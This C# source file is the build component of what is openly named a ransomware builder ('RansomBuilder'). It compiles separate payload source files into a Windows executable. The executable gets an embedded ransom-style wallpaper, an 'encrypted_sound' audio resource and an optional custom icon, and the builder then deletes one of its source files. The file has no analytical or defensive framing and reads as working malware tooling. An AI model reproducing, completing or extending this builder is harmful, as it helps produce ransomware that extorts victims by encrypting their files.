using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.CodeDom.Compiler;
using System.Windows.Forms;
namespace RansomBuilder
{
    class Builder
    {

        public static bool Build(string exe_name,  string icon_path)
        {
            CodeDomProvider Compiler = CodeDomProvider.CreateProvider("CSharp");
            CompilerParameters Parameters = new CompilerParameters();
            CompilerResults cResults = default(CompilerResults);
            Parameters.GenerateExecutable = true;
            Parameters.OutputAssembly = exe_name;
            Parameters.ReferencedAssemblies.Add("System.dll");
            Parameters.ReferencedAssemblies.Add("System.Drawing.dll");
            Parameters.ReferencedAssemblies.Add("System.Windows.Forms.dll");
            Parameters.EmbeddedResources.Add(Environment.CurrentDirectory + "\\Sources\\Images\\wallpaper.jpg");
            Parameters.EmbeddedResources.Add(Environment.CurrentDirectory + "\\Sources\\Sounds\\encrypted_sound.wav");
            //ADD EMBEDDED SOURCE FILE WHAT YOU WANT..

            Parameters.CompilerOptions = " /target:winexe";
            if (!string.IsNullOrEmpty(icon_path))
            {
                Parameters.CompilerOptions = " /win32icon:\"" + @icon_path + "\"";
            }
            Parameters.TreatWarningsAsErrors = false;
            cResults = Compiler.CompileAssemblyFromFile(Parameters, new string[] {
             Environment.CurrentDirectory+"\\Form1.cs", Environment.CurrentDirectory + 
            "\\Sources\\Program.cs", Environment.CurrentDirectory + "\\Sources\\Form1.Designer.cs"
          ,Environment.CurrentDirectory + "\\Sources\\CenterScreen.cs"
             });
            if (cResults.Errors.Count > 0)
            {
                 foreach(var c in cResults.Errors)
                {
                    MessageBox.Show(c.ToString());
                }
                return false;
            }
            else if (cResults.Errors.Count == 0)
            {
                System.IO.File.Delete(Environment.CurrentDirectory + "\\Form1.cs");
                return true;
              
            }
            return true;
        }
    }
}
